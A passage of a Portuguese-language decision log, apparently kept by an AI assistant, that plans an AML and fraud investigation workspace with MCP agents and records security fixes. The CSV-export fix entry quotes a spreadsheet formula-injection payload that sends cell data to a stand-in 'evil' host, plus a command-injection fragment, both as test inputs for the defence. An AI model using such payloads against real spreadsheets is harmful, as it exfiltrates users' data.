@@ -9858,3 +9858,1645 @@ qualquer esquema de app — `vscode://`, `claude-cli://`, `cursor://`, `obsidian
 **Author:** Claude (AI Assistant)
 
 ---
+## [2026-10-09 15:27] - Feature Planning: Graph Lagoon como sistema de investigação
+
+**Purpose:** evoluir o Graph Lagoon de explorador de grafos para **sistema de investigação**
+de fraude, PLD/FT e risco para adquirentes e bancos, com quatro capacidades:
+- unir várias explorações;
+- carregar CSVs;
+- montar e enriquecer um grafo em memória;
+- seguir o dinheiro.
+
+Plano completo: [plans/investigation-workspace.md](plans/investigation-workspace.md).
+
+**User Story:** como analista de prevenção a fraude ou de PLD, quero juntar num mesmo caso
+explorações, extratos (inclusive SIMBA) e cadastros (QSA), resolver as entidades e rastrear
+valores salto a salto, para fechar o dossiê e decidir comunicar, marcar ou arquivar.
+
+**Avaliação feita (resumo):**
+- **Mercado.** Foram avaliados workbenches de vínculos (i2, Linkurious, Maltego, Bloom),
+  ER e redes (Quantexa, Palantir), fraude/PLD com casos (Actimize, SAS, Feedzai, Unit21,
+  Lucinity) e follow the money (Reactor, TRM, Elliptic, Valid8). Não há **aplicação de
+  investigação aberta e nativa do warehouse**. Os métodos de rastreio (Δ, alocação) são
+  opacos em todas.
+- **Contexto brasileiro.**
+  - Circ. 3.978: dossiê, prazos de 45+45 dias, parâmetros auditáveis, 10 anos de retenção.
+  - CC 4.001: indicadores que são padrões de grafo.
+  - MED 2.0 (Res. BCB 493/2025): rastreio Pix em camadas.
+  - Res. BCB 587/2026 (DICT), RC6, portarias SPA de bets, LGPD e LC 105.
+  - SIMBA: 5 arquivos TAB, com 29–35% de contrapartes sem identificação.
+- **Código.** Não há upload de CSV nem grafo só no cliente. A exploração é 1:1 com o
+  context. Não há timeline nem path finding. Bloqueios: #28 (IDs de arestas paralelas
+  colidem), #32 e M4.
+
+**Design Decisions (propostas, a validar no design):**
+1. A **Investigação** é uma entidade nova acima da Exploração e funciona como o dossiê
+   da Circ. 3.978 art. 43.
+2. A identidade das entidades vem de chaves de negócio (CPF/CNPJ, conta, chave Pix,
+   dispositivo). O merge preserva a origem; match incerto vira "match link".
+3. O grafo de trabalho fica em memória no browser, com proveniência. O CSV é parseado no
+   cliente, e o arquivo bruto vai ao servidor com SHA-256.
+4. A transação é uma aresta temporal com valor. O rastreio roda em worker e o método
+   (saltos, Δ, alocação FIFO/proporcional/LIBR, paradas) vai gravado na evidência.
+5. Novas permissões `investigation.create`, `investigation.upload` e
+   `investigation.export`. Auditoria de leitura. Sem e-filing no Siscoaf.
+
+**Implementation:** nenhuma ainda. As fases de design D0–D4 e o roadmap F1–F5 estão no plano.
+
+**Files Created:**
+- [docs/dev/plans/investigation-workspace.md](plans/investigation-workspace.md)
+
+**Public Docs:** nenhuma alteração. Isto é planejamento; F1–F4 vão exigir guia novo em
+`docs/guide/`.
+
+**Admin-Area Impact:** nenhum agora. A F1 vai adicionar tabelas (investigações, fontes),
+rotas mutáveis e permissões, então serão necessários `CLEARABLE_TABLES`,
+`AUDITED_ROUTES`, `AuditAction` e o catálogo.
+
+**Author:** Claude (AI Assistant)
+
+---
+## [2026-10-09 16:05] - Feature Planning (rev. 2): explorações multi-context, arquivos e tabelas de enriquecimento
+
+Detalhamento do plano [plans/investigation-workspace.md](plans/investigation-workspace.md)
+após perguntas do usuário. Ver §4.1a–4.5 do plano.
+
+**Decisões novas:**
+1. **Investigação = N explorações de contexts diferentes.** Cada exploração continua presa
+   ao seu context (FK inalterada) e é vista em abas. A investigação acrescenta uma visão
+   unificada, que une as entidades pelas **chaves de identidade** declaradas no context,
+   e a seleção vinculada entre abas. Compartilhar a investigação não concede acesso aos
+   contexts (LC 105).
+2. **Tabelas de enriquecimento no context:** tabelas extras que não entram na query do
+   grafo e são consultadas por chave (cardinalidade one/many, colunas declaradas). Elas
+   **entram em `sql_scope.context_tables()`**, porque senão leitores sem `context.create`
+   levam 403. Como anexar uma tabela amplia o escopo dos leitores, só anexa quem tem
+   `context.create`, e a tabela precisa estar na allowlist. A consulta é por endpoint
+   parametrizado, nunca SQL livre.
+3. **Arquivos têm três papéis:**
+   - **grafo:** um context de arquivo, com datasource `file` novo;
+   - **enriquecimento:** escopo da investigação;
+   - **anexo:** com hash.
+4. **Algoritmos novos:** rastreio temporal com alocação, caminhos (incluindo os que
+   respeitam o tempo), agregação de arestas paralelas, resolução de entidades,
+   tipologias em janela de tempo, componentes conexos. Os existentes (centralidades,
+   Louvain, ego, métricas customizadas) são reaproveitados.
+5. **Layouts novos:** fluxo em camadas (estende o hierárquico), linha do tempo em raias,
+   Sankey, bipartido (talvez um preset do hive), mapa (depois).
+6. **Interação e documentação novas:**
+   - workspace com abas e seleção vinculada, rastreio interativo, papéis nas entidades;
+   - fila de matches, desfazer;
+   - diário automático, notas ancoradas, hipóteses, evidências congeladas, dossiê gerado.
+
+**Public Docs:** nenhuma alteração (planejamento).
+
+**Admin-Area Impact:** nenhum agora. Na F2, tabelas de enriquecimento ampliam o escopo de
+query, o que exige um teste em `test_sql_scope` e entrada em `AUDITED_ROUTES` para a
+rota de enriquecimento.
+
+**Author:** Claude (AI Assistant)
+
+---
+## [2026-10-09 17:05] - Design: investigação, hoje × proposta (fases D0–D3 do plano)
+
+Design feito num canvas de artboards, fora do repositório e privado para o autor, com
+18 pranchas em 5 páginas:
+- **Mapa do sistema** (hoje × proposta).
+- **Hoje:** 4 telas reais (screenshots de `docs/public/screenshots/`) com as dores D1–D9
+  anotadas.
+- **Fluxos:** jornada atual do golpe Pix; fluxos propostos A (golpe Pix → rastreio),
+  B (lojistas de fachada), C (SIMBA) e 0 (preparar o context).
+- **Telas hi-fi T1–T7:**
+  - fila;
+  - workspace com abas e visão unificada;
+  - adicionar ao caso;
+  - assistente de arquivo SIMBA;
+  - seguir o dinheiro (camadas/Sankey + raias);
+  - context com chaves e enriquecimento;
+  - dossiê.
+- **Comparação** hoje × proposta.
+
+**Avaliação do fluxo principal (contada nos mapas):**
+
+| | Hoje | Proposta (fluxo A) |
+|---|---|---|
+| Passos | 10 | 9 (8 no app + Siscoaf) |
+| Ferramentas | 7 | 2 |
+| Trocas de ferramenta | 8 | 1 |
+| Exportações manuais | 2 | 0 intermediárias |
+| Registro do que foi feito | nenhum | 8 de 8 passos no diário |
+
+**Design Decisions:**
+1. **Mesmo vocabulário visual do app:** barra navy de 52 px, painéis acoplados, botões
+   flutuantes sobre o canvas, status bar. A investigação é uma extensão, não um produto à
+   parte.
+2. **Botão primário escurecido para `#0f766e`.** O `#14b8a6` com texto branco não passa
+   4,5:1. Vale aplicar no app todo (achado de acessibilidade, fora do escopo daqui).
+3. **Cores separadas por canal:**
+   - proveniência = **anel** do nó: teal Pix, roxo Cadastro, âmbar arquivo;
+   - papel = **preenchimento**: azul vítima, laranja laranja;
+   - saída = **forma quadrada** navy.
+
+   Nunca só cor: a legenda e os rótulos estão sempre presentes.
+4. **Exploração restrita aparece como placeholder** com o dono do context, e não some.
+   O analista precisa saber que falta parte do caso (LC 105).
+5. **Rastreio com o método visível:** carimbo de parâmetros no painel, resultado em
+   FIFO com o valor proporcional ao lado. Isso mostra que a regra de alocação muda o
+   número.
+6. **Contraparte desconhecida do SIMBA vira um nó por transação.** Agrupá-las criaria um
+   hub falso.
+
+**Pontos de atenção encontrados nos fluxos:**
+- explosão de fan-out no "+1 salto";
+- CPF mascarado do QSA só gera sugestão de match;
+- anexar uma tabela amplia o escopo do context, então o bloqueio precisa dizer a quem
+  pedir.
+
+**Public Docs:** nenhuma alteração (design).
+
+**Admin-Area Impact:** nenhum.
+
+**Author:** Claude (AI Assistant)
+
+---
+## [2026-10-09 18:10] - Feature Planning: pacote de execução de investigações para agentes
+
+**O quê:** o plano, a pesquisa e o design de investigações viraram um pacote
+autossuficiente em [plans/investigation/](plans/investigation/README.md). Um agente
+consegue implementar a partir dele sem depender desta conversa nem dos artefatos
+privados no claude.ai.
+
+**Conteúdo:**
+- `README.md`: ponto de entrada, ordem de leitura, regras de trabalho (Definition of
+  Done) e decisões em aberto Q1 a Q6, cada uma com o padrão recomendado.
+- `00-pesquisa-mercado.md` e `01-pesquisa-brasil.md`: as pesquisas completas, com
+  fontes.
+- `02-design.md`: sistema visual, telas T1 a T9, direções A/B/C, fluxos (hoje, A, B,
+  C, 0) e avaliação.
+- `03-arquitetura.md`: modelo de dados (colunas novas em `graph_contexts`, 8 tabelas
+  novas), API, especificação de mapeamento de arquivo, unificação do grafo e
+  algoritmos. Inclui o **rastreio temporal** com FIFO, proporcional, LIBR e
+  contaminação total, e a fixture do golpe Pix com os valores esperados.
+- `04-plano-de-implementacao.md`: portões G1 a G4 e tarefas F1.1 a F5.3, cada uma com
+  dependências, arquivos reais, passos, aceite e testes, numa lista de progresso
+  marcável.
+- `screens/`, `diagrams/` e `mockups/`: PNG das telas e diagramas, renderizados das
+  pranchas com o Playwright do projeto, e o HTML-fonte.
+
+**Decisões fixadas no pacote:**
+1. O interpretador de mapeamento em Python é o **autoritativo**; o TS serve à prévia.
+   A paridade é garantida por fixtures douradas comuns.
+2. O diário do caso é **encadeado por hash**, separado do `usage_logs` de auditoria.
+3. Um caso decidido é imutável e não pode ser apagado (409); retenção configurável,
+   padrão 10 anos.
+4. Os critérios de aceite do rastreio usam a mesma fixture das telas T5 e T7:
+   - FIFO: 4.430 de 4.870 (91%);
+   - proporcional: Exchange = 1.597,73;
+   - com Δ = 40 min, só a saída das 15:05 é cortada.
+
+**Public Docs:** nenhuma alteração; os guias públicos estão nas tarefas F1.9 em
+diante.
+
+**Admin-Area Impact:** nenhum agora; o impacto de cada tarefa está no plano.
+
+**Author:** Claude (AI Assistant)
+
+---
+## [2026-10-09 19:45] - Feature Planning: investigações AI-first e armazenamento no Volume
+
+**Pedido:** confirmar que os arquivos enviados vão para o Volume e incluir uma etapa
+AI-first: API e servidor MCP para um agente de IA criar e evoluir a investigação e
+subir artefatos (slides, docs, relatórios) no espaço do caso.
+
+**Achado sobre o armazenamento:** o plano já mandava arquivos ao `BlobStore` (local ou
+Volume via Files API). Mas o `BlobStore.save()` recebe o arquivo inteiro em memória e
+sobrescreve, e não havia setting próprio. Corrigido no plano:
+- `investigations_volume_path` (padrão: subpasta de `databricks_volume_path`);
+- `save_stream` com sha256 calculado durante o upload;
+- endereçamento por conteúdo, nunca sobrescrever;
+- layout `files/`, `sources/`, `evidence/`, `artifacts/`, `exports/` (03 §2.3);
+- limite de request do Databricks Apps e da Files API como Q3.
+
+**Etapa nova FA (7 tarefas, entre F1 e F2):**
+- FA.1: tokens de agente `glt_` (escopos `read`, `analyze`, `write`, `propose`; hash
+  guardado; validade; revogação) e ator no diário.
+- FA.2: armazenamento no Volume e espaço de artefatos versionados (T10).
+- FA.3: propostas com aceite humano (T11).
+- FA.4: servidor MCP em `/mcp` (SDK oficial, Streamable HTTP, ferramentas sobre a
+  camada de serviço).
+- FA.5: ponte stdio para apps atrás do proxy do Databricks.
+- FA.6: registry com teste que obriga cobertura MCP.
+- FA.7: guia público e E2E.
+- Também a **F3.8**: rastreio e caminhos portados para Python com paridade pela mesma
+  fixture, porque o agente não roda web workers. E a F4.3 ganhou tipologias espelhadas
+  em Python.
+
+**Design Decisions:**
+1. **O agente age em nome de uma pessoa,** nunca com mais acesso que ela.
+2. **O que o agente faz direto:** notas, evidências, fontes, artefatos em rascunho.
+3. **O que vira proposta:** papel, match, hipótese, tipologia, status.
+4. **Só humano:** decidir, comunicar, marcar no DICT, compartilhar, apagar, aprovar
+   artefato. Bloqueado por `forbid_agents` mesmo para superuser.
+5. **Dados pessoais vão mascarados** para agentes por padrão (LGPD: envio a provedor
+   de LLM); o admin libera com `agents_allow_unmasked_data`.
+6. **Conteúdo de dados vai marcado como `untrusted_data`** nas respostas MCP (prompt
+   injection). Nenhuma ferramenta executa código nem expõe caminho de Volume.
+7. **HTML e SVG de artefatos só para download,** nunca renderizados (XSS).
+8. **Regra AI-first no Definition of Done (#11):** a partir da FA.6, rota nova de
+   investigação entrega ferramenta MCP ou é registrada como só humana.
+
+**Files Modified:** `plans/investigation/` (README, 02, 03, 04), telas novas
+`screens/T10-Espaco.png`, `screens/T11-Agentes.png` e os mockups.
+
+**Public Docs:** nenhuma alteração ainda; o guia `docs/guide/agents-mcp.md` está na
+FA.7.
+
+**Admin-Area Impact:** nenhum agora. A FA traz settings, tabelas, rotas e a permissão
+`investigation.agent`, previstos na FA.1 e na FA.2.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-09 20:20] - Docs: plano de investigações AI-first desde o início, repositório igual ao artefato
+
+O título, o resumo e o topo do plano passam a apresentar o produto como **sistema de
+investigação AI-first**: agentes de IA trabalham no caso via MCP e pessoas decidem. A
+seção "AI-first: agentes trabalham no caso, pessoas decidem" (o que o agente faz
+direto, propõe e nunca faz) fica logo no início, nos dois lugares:
+- no `plans/investigation-workspace.md` e no `plans/investigation/README.md`;
+- no documento do plano no claude.ai, renomeado para "Plano: Graph Lagoon como
+  sistema de investigação AI-first".
+
+No documento também foram corrigidas as legendas dos diagramas, o armazenamento no
+Volume e a lista de riscos.
+
+**Public Docs:** nenhuma alteração. **Admin-Area Impact:** nenhum.
+
+---
+
+## [2026-10-09 20:30] - Feature Implemented: G1 · Corrigir o #28 (IDs de arestas paralelas colidem)
+
+**Feature:** sem coluna de id de aresta, o id composto `src@tipo@dst` agora recebe
+`@{digest}`: um hash estável das demais colunas da linha. Duas transações entre as
+mesmas contas deixam de virar uma aresta só no merge.
+
+**Requirements:** tarefa G1 de `docs/dev/plans/investigation/04-plano-de-implementacao.md`
+(dívida #28 em `docs/dev/technical-debts.md`).
+
+**Design Decisions:**
+1. **Digest:** sha256 (`hashlib`, nunca `hash()`, que muda por processo) de um JSON
+   canônico das colunas não estruturais e não nulas, ordenadas por nome; primeiros
+   16 hex (`EDGE_ID_DIGEST_LEN`, 64 bits). Escalares viram string como em
+   `_stringify_scalar`, então `1.5` e `"1.5"` dão o mesmo id; NULL e coluna ausente
+   também.
+2. **Compatibilidade:** linha só com colunas estruturais mantém `src@tipo@dst`
+   (`src@@dst` sem tipo). Contexts sem propriedades de aresta não mudam de id, e o
+   teste existente `a@@b` continua valendo.
+3. **Mesmo id nos dois caminhos:** o struct `r` do Cypher transpilado carrega as
+   propriedades de aresta configuradas no context; subgraph/expand só carregavam as
+   estruturais. Hashear só de um lado daria dois ids para a mesma aresta e duplicaria
+   no merge do expand. Por isso `build_edge_named_struct` ganhou `extra_columns`, e
+   `edge_identity_columns(context, config)` devolve as propriedades configuradas
+   quando não há `edge_id_col` (vazio quando há). Efeito colateral aceito: nesse caso
+   as arestas de subgraph/expand passam a vir com propriedades, como as do Cypher.
+4. **Linhas idênticas em tudo continuam colidindo:** aceitável e documentado
+   (guia Triple Stores e dívida #28).
+5. **Frontend:** não monta ids compostos. Usa o `edge_id` do backend como opaco; o
+   remapeamento de cluster fechado (`stores/graph.ts`) só prefixa o id do backend, e
+   herda a unicidade. Sem mudança no frontend.
+6. **Fora do escopo:** o datasource REST usa `src->dst:label#i` (índice da resposta),
+   que não colide dentro de uma resposta; Neptune usa o id nativo.
+
+**Files Created:**
+- [api/tests/test_edge_ids.py](api/tests/test_edge_ids.py)
+
+**Files Modified:**
+- [api/graphlagoon/services/graph_operations.py](api/graphlagoon/services/graph_operations.py) (`_get_edge_id`, `_edge_property_digest`, `EDGE_ID_DIGEST_LEN`)
+- [api/graphlagoon/services/datasource/sql_warehouse.py](api/graphlagoon/services/datasource/sql_warehouse.py) (`edge_identity_columns`, `build_edge_named_struct(extra_columns)`, subgraph/expand)
+- [docs/guide/triple-stores.md](docs/guide/triple-stores.md)
+- [docs/dev/technical-debts.md](docs/dev/technical-debts.md) (#28 resolvido)
+
+**Testing:**
+- [x] `api/tests/test_edge_ids.py` (22 testes): transações paralelas sem tipo e com
+  tipo, linhas idênticas colidem, forma do id, valor fixo (golden), ordem de colunas,
+  NULL × ausente, escalar × string, estabilidade entre processos com `PYTHONHASHSEED`
+  diferentes, SQL de subgraph/expand com as colunas de propriedade, e as chaves do
+  struct `r` do transpilador iguais a `edge_identity_columns`.
+- [x] Suite backend: 1293 passed, 1 skipped (fora as falhas pré-existentes conhecidas
+  de `test_cypher_comments.py` e `test_transpile_options`).
+- [x] `npx vitepress build` ok. Sem mudança no frontend; vitest/vue-tsc/E2E não rodados.
+
+**Public Docs:** nova seção "Parallel edges without an edge id column" em
+`docs/guide/triple-stores.md`.
+
+**Admin-Area Impact:** no admin-area impact.
+
+**Assumptions:**
+- Nenhuma das decisões Q1–Q9 se aplica à G1.
+- Snapshots salvos antes da G1, de contexts sem coluna de id e com propriedades de
+  aresta, guardam os ids antigos; expandir nós neles pode duplicar essas arestas uma
+  vez. O mesmo vale se o admin mudar a seleção de propriedades de aresta. Aceito: é o
+  custo único da correção.
+- Uma propriedade de aresta configurada que sumiu da tabela agora também falha no
+  subgraph/expand (antes só no Cypher), com o erro de schema já classificado.
+- Nota geral do plano: este ambiente não tem credenciais de push nem `gh` CLI; push e
+  PR ficam com o mantenedor (decisão do orquestrador).
+
+**Author:** Claude (AI Assistant)
+
+---
+
+---
+
+## [2026-10-09 21:00] - Docs: plano de investigações sincronizado com `feature/groups-permissions` e status atualizado
+
+O branch `feature/investigations` nasceu do `5e5742a` e não tinha os 3 commits de docs
+que chegaram depois em `origin/feature/groups-permissions` (`c2978a1`, `8495eaa`,
+`4efea5b`: tabela "hoje × proposta", plano original atualizado, AI-first no topo,
+diagramas regerados). Foram trazidos por **merge** (não rebase, para não reescrever
+história); o único conflito foi o fim deste decision log, resolvido mantendo as duas
+entradas em ordem de horário.
+
+**Atualizações nos planos:**
+1. `investigation/README.md`: o cabeçalho deixa de dizer "nenhuma linha de código" e
+   aponta o progresso (G1 feita); a tabela "hoje × proposta" esclarece que só os
+   portões G começaram.
+2. Regra 9 do Definition of Done: "um branch por fase" contradizia o prompt de
+   execução autônoma; passa a ser um branch só, `feature/investigations`.
+3. Regra 4: alternativa `api/.venv/bin/pytest` quando o `uv run` não acha o checkout
+   irmão do `gsql2rsql` (`../../cyper2dsql`).
+4. `investigation-workspace.md`: o status diz que a execução começou.
+
+**Public Docs:** nenhuma alteração. **Admin-Area Impact:** nenhum.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-09 21:30] - Feature Implemented: G2 · Corrigir o M4 (injeção de fórmula em exportação CSV)
+
+**Feature:** toda exportação CSV/TSV passa por `frontend/src/utils/csvSafe.ts`. Um valor
+como `=HYPERLINK("http://evil/?"&A1,"Click")` vindo do warehouse sai como texto
+(`'=HYPERLINK(...)`) e não vira fórmula na planilha de quem abre o arquivo.
+
+**Requirements:** tarefa G2 de `docs/dev/plans/investigation/04-plano-de-implementacao.md`
+(achado M4 de `docs/dev/security-assessment.md`).
+
+**Design Decisions:**
+1. **`safeCell(v)`:** prefixa `'` em strings cujo primeiro caractere é `=`, `+`, `-`,
+   `@`, tab ou CR. Só strings: números, booleanos e null voltam iguais.
+2. **Literal numérico puro não é prefixado:** o warehouse devolve tudo como string, e
+   o TSV do Query Console recebe `"-5"`, não `-5`. Prefixar quebraria o aceite
+   "negativos continuam números". A regex `^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$`
+   só aceita o número inteiro; `-2+3+cmd|...` continua prefixado.
+3. **`safeCellText(v)`:** checa a forma `String()` de arrays, objetos e datas (o
+   `String(['=1+1'])` é `=1+1`, que passaria por um filtro só de strings). Números e
+   booleanos tipados passam direto.
+4. **Um escape só para CSV manual e TSV:** `escapeDelimitedField` substitui o
+   `escapeField` de `tableExport.ts` e o escape inline dos dois modais. Efeito
+   colateral bom: os modais passam a pôr aspas em campos com quebra de linha (antes
+   quebravam a linha do CSV).
+5. **PrimeVue:** `:exportFunction="primeVueExportCell"` nas duas DataTables
+   (`DataTablePanel.vue` e `DataGrid.vue`, que serve o Query Console). O PrimeVue
+   põe as aspas externas, então a função só neutraliza e dobra as aspas internas,
+   como o default dele. O cabeçalho também passa por `:exportHeader`
+   (`primeVueExportHeader(col.header || col.field)`): ele carrega a chave da
+   propriedade e o PrimeVue o escreve sem escape nenhum.
+6. **Revisão da tentativa anterior (interrompida):** mantida a estrutura; corrigidos
+   o bypass por array/objeto (item 3) e o fallback do cabeçalho vazio para o `field`
+   sem saneamento.
+
+**Files Created:**
+- [frontend/src/utils/csvSafe.ts](frontend/src/utils/csvSafe.ts)
+- [frontend/src/utils/__tests__/csvSafe.test.ts](frontend/src/utils/__tests__/csvSafe.test.ts)
+- [frontend/src/components/__tests__/ClusterNodeModal.test.ts](frontend/src/components/__tests__/ClusterNodeModal.test.ts)
+- [frontend/src/components/__tests__/DataGrid.export.test.ts](frontend/src/components/__tests__/DataGrid.export.test.ts)
+- [frontend/src/components/__tests__/DataTablePanel.export.test.ts](frontend/src/components/__tests__/DataTablePanel.export.test.ts)
+
+**Files Modified:**
+- [frontend/src/utils/tableExport.ts](frontend/src/utils/tableExport.ts)
+- [frontend/src/components/ClusterNodeModal.vue](frontend/src/components/ClusterNodeModal.vue)
+- [frontend/src/components/CommunityNodeModal.vue](frontend/src/components/CommunityNodeModal.vue)
+- [frontend/src/components/DataTablePanel.vue](frontend/src/components/DataTablePanel.vue)
+- [frontend/src/components/DataGrid.vue](frontend/src/components/DataGrid.vue)
+- [frontend/src/utils/__tests__/tableExport.test.ts](frontend/src/utils/__tests__/tableExport.test.ts)
+- [frontend/src/components/__tests__/CommunityNodeModal.test.ts](frontend/src/components/__tests__/CommunityNodeModal.test.ts)
+- [docs/dev/security-assessment.md](docs/dev/security-assessment.md) (M4 marcado como corrigido)
+
+**Testing:**
+- [x] `csvSafe.test.ts` (25 testes): gatilhos, literais numéricos, texto seguro,
+  tipos não string, escape RFC 4180, ganchos do PrimeVue.
+- [x] Um teste por caminho, com o payload `=HYPERLINK(...)` e um `-5` que precisa
+  sair sem prefixo: `tableExport.test.ts` (TSV), `ClusterNodeModal.test.ts`,
+  `CommunityNodeModal.test.ts` (Blob capturado via `URL.createObjectURL`),
+  `DataTablePanel.export.test.ts` e `DataGrid.export.test.ts` (o `exportCSV()` real
+  do PrimeVue). Conferido que o teste do `DataTablePanel` falha sem o
+  `exportFunction`.
+- [x] vitest: 145 arquivos, 2451 testes verdes. `vue-tsc --noEmit` limpo.
+- [x] E2E: `query-console.spec.ts` (o único spec que toca o botão CSV), 14 passed.
+
+**Public Docs:** no public docs impact (comportamento de segurança interno; o CSV
+continua com as mesmas colunas).
+
+**Admin-Area Impact:** no admin-area impact.
+
+**Assumptions:**
+- Nenhuma das decisões Q1–Q9 se aplica à G2.
+- Prefixo `'` (pedido pelo plano) em vez de espaço ou tab. Algumas versões do Excel
+  mostram o apóstrofo ao abrir um CSV; é o custo aceito da mitigação padrão (OWASP).
+- Só o primeiro caractere é checado; `" =1+1"` não é prefixado.
+
+**Author:** Claude (AI Assistant)
+
+## [2026-10-09 22:00] - Feature Implemented: G3 · Sandbox dos cluster programs (#32)
+
+**Feature:** cluster programs saem da thread principal. Cada execução sobe um worker
+de módulo dedicado que remove rede, storage, mensageria e workers aninhados do escopo
+(`hardenScope` de `customMetricSandbox.ts`) antes de rodar o código, e a thread
+principal o encerra após 10 s (`CLUSTER_PROGRAM_TIMEOUT_MS`).
+
+**Requirements:** tarefa G3 de `docs/dev/plans/investigation/04-plano-de-implementacao.md`
+(tech debt #32; avança o C1 de `docs/dev/security-assessment.md`).
+
+**Design Decisions:**
+1. **Mesmo padrão do custom metric:** worker captura o próprio `postMessage`, despe o
+   escopo, responde `READY` e serve um `RUN`. Worker por execução, sem pool: sempre
+   terminado ao fim, então código do usuário não sobrevive em segundo plano.
+2. **Validação continua na thread principal** (`computeClustersFromProgram`), então
+   uma mensagem forjada não injeta cluster inválido. A função virou `async`; os dois
+   chamadores (`executeProgram`, `runClusterProgramAsCommunity`) passam a aguardar.
+3. **Snapshot clonável:** `toRaw` nos nós/arestas (proxies Vue não clonam). O helper
+   `metric(ref, id)` é reconstruído no worker (`clusterProgramEvaluate.ts`) com a mesma
+   semântica do `metricResolver` (id, depois nome no alvo; nó antes de aresta). Os
+   valores das métricas só são enviados quando o código menciona `metric`.
+4. **Resultado não clonável** (ex.: função) vira erro legível
+   `Program result cannot be transferred: …`.
+5. **Revisão da tentativa anterior (interrompida):** a implementação já estava no
+   working tree; revisada contra o padrão do custom metric e o `metricResolver`,
+   mantida sem mudanças de código.
+
+**Files Created:**
+- [frontend/src/workers/clusterProgramWorker.ts](frontend/src/workers/clusterProgramWorker.ts)
+- [frontend/src/workers/clusterProgramEvaluate.ts](frontend/src/workers/clusterProgramEvaluate.ts)
+- [frontend/src/services/clusterProgramRunner.ts](frontend/src/services/clusterProgramRunner.ts)
+- [frontend/src/__tests__/fixtures/inlineClusterProgramWorker.ts](frontend/src/__tests__/fixtures/inlineClusterProgramWorker.ts) (substituto em processo; o happy-dom não tem worker)
+- [frontend/src/services/__tests__/clusterProgramRunner.test.ts](frontend/src/services/__tests__/clusterProgramRunner.test.ts)
+- [frontend/src/workers/__tests__/clusterProgramEvaluate.test.ts](frontend/src/workers/__tests__/clusterProgramEvaluate.test.ts)
+
+**Files Modified:**
+- [frontend/src/stores/cluster.ts](frontend/src/stores/cluster.ts), [frontend/src/stores/community.ts](frontend/src/stores/community.ts)
+- [frontend/src/types/cluster.ts](frontend/src/types/cluster.ts) (snapshot, protocolo, timeout)
+- [frontend/src/utils/clusterProgramSkill.ts](frontend/src/utils/clusterProgramSkill.ts) (prompt de IA cita o sandbox e o limite)
+- [frontend/src/__tests__/setup.ts](frontend/src/__tests__/setup.ts), [frontend/src/stores/__tests__/cluster.test.ts](frontend/src/stores/__tests__/cluster.test.ts)
+- [docs/guide/clusters.md](docs/guide/clusters.md), [docs/dev/technical-debts.md](docs/dev/technical-debts.md) (#32 resolvido), [docs/dev/security-assessment.md](docs/dev/security-assessment.md) (C1 passo 6 parcial)
+
+**Testing:**
+- [x] vitest: `cluster.test.ts` (inclui timeout e os 3 programas padrão),
+  `clusterProgramRunner.test.ts`, `clusterProgramEvaluate.test.ts`,
+  `community.clusterProgram.test.ts`, `community.table.test.ts`: 126 verdes.
+- [x] `vue-tsc --noEmit` limpo.
+- [x] E2E com o worker real no Chromium: `graph.spec.ts` "a program run lands in the
+  Results tab…" e "deleting a cluster is undoable…", 2 passed.
+
+**Public Docs:** `docs/guide/clusters.md` explica o sandbox, o limite de 10 s e as
+duas mensagens de erro novas.
+
+**Admin-Area Impact:** no admin-area impact.
+
+**Assumptions:**
+- Nenhuma das decisões Q1–Q9 se aplica à G3.
+- Timeout fixo de 10 s, igual ao do custom metric; não virou setting.
+- Fora do escopo (C1 restante): CSP (#31/B1), confirmação de autor e propagação
+  silenciosa de programas para o context.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-09 21:30] - Decisão: G4 · teto do grafo no browser (pulada para o MVP)
+
+O mantenedor pediu para acelerar o MVP e considerou a medição da G4 desnecessária
+agora. **Decisão:** `INVESTIGATION_MAX_WORKING_EDGES = 50_000`, sem medição. Isso
+responde a Q5 provisoriamente.
+
+**Justificativa:** 50 mil é o menor dos três tamanhos que o plano mandava medir. Como
+o grafo de um caso de golpe Pix tem centenas a poucos milhares de arestas, sobra
+folga. O número vira o setting `investigation_max_working_edges` na F2.3. Medir
+(`make perf-report`) fica para quando algum caso real bater no teto.
+
+**Public Docs:** nenhuma. **Admin-Area Impact:** nenhum agora; o setting entra na F2.3.
+
+---
+
+## [2026-10-09 23:00] - Feature Implemented: F1.1 · Modelos, migração 016 e paridade em memória
+
+**Feature:** as 8 tabelas de investigação de 03 §2.2 (`investigations`,
+`investigation_shares`, `_sources`, `_files`, `_events`, `_notes`, `_evidence`,
+`entity_matches`) e as colunas `identity_keys`, `enrichment_tables` e `edge_semantics`
+em `graph_contexts`, com migração 016 e paridade no `InMemoryStore`.
+
+**Design Decisions:**
+1. Filhas com FK `ON DELETE CASCADE` para `investigations`; só `shares` tem
+   relationship ORM (usada pelo controle de acesso). `sources.exploration_id` e
+   `sources.file_id` são `SET NULL`; `sources.context_id` sem FK, para o placeholder
+   sobreviver ao context apagado.
+2. Memória: dataclasses `Memory…` para cada tabela; CRUD dedicado para caso e share e
+   CRUD genérico (`add/get/list/update/delete_investigation_child`) para as 6 filhas,
+   pelo mapa `INVESTIGATION_CHILDREN`. Cascade e `SET NULL` espelhados.
+3. As colunas novas do context só existem no modelo; schemas e validação entram nas
+   tarefas que as usam (F1.4, F2.1, F3.1).
+
+**Files:** `api/graphlagoon/db/models.py`, `api/graphlagoon/db/memory_store.py`,
+`api/graphlagoon/alembic/versions/016_investigations.py`,
+`api/graphlagoon/routers/admin_registry.py` (`CLEARABLE_TABLES`),
+`api/tests/test_investigation_store.py` (novo), `api/tests/test_admin_registry.py`.
+
+**Testing:** `test_investigation_store.py`, `test_admin_registry.py`,
+`test_dev_seed.py`: 48 verdes. Migração 016 rodada isolada (upgrade, upgrade
+idempotente, downgrade, re-upgrade) via `MigrationContext` sobre SQLite; DDL Postgres
+compilada do ORM. App sobe em modo memória.
+
+**Assumptions:** sem Postgres no ambiente, `make dev-db` não foi verificado (`[~]` no
+plano). Nenhuma decisão Q1–Q9 se aplica.
+
+**Public Docs:** no public docs impact. **Admin-Area Impact:** tabelas novas em
+`CLEARABLE_TABLES`; `clear_all` limpa as coleções novas.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-09 23:30] - Feature Implemented: F1.2 · API de investigações
+
+**Feature:** `GET/POST /api/investigations`, `GET/PATCH/DELETE /api/investigations/{id}`,
+`POST /api/investigations/{id}/share` e `DELETE …/share/{email}`, com permissão
+`investigation.create`, auditoria e compartilhamento só nominal.
+
+**Design Decisions:**
